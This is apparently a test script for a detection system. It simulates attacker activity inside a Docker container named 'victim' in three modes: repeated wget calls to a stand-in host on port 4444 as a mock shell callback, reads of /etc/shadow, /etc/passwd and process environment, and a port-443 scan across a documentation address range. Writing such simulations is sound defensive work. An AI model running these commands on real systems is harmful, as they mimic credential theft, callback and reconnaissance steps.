#!/bin/sh
# Simulate attacker activity inside the victim container (run AFTER the baseline is learned).
case "${1:-shell}" in
  shell)  docker exec victim sh -c 'for i in 1 2 3; do sh -c "wget -q -T1 -O- http://203.0.113.7:4444 || true"; done' ;;
  creds)  docker exec victim sh -c 'for i in 1 2 3 4 5 6; do cat /etc/shadow /etc/passwd /proc/1/environ >/dev/null; done' ;;
  scan)   docker exec victim sh -c 'for i in $(seq 1 30); do wget -q -T1 -O- http://198.51.100.$i:443 || true; done' ;;
  *) echo "usage: $0 [shell|creds|scan]"; exit 1 ;;
esac
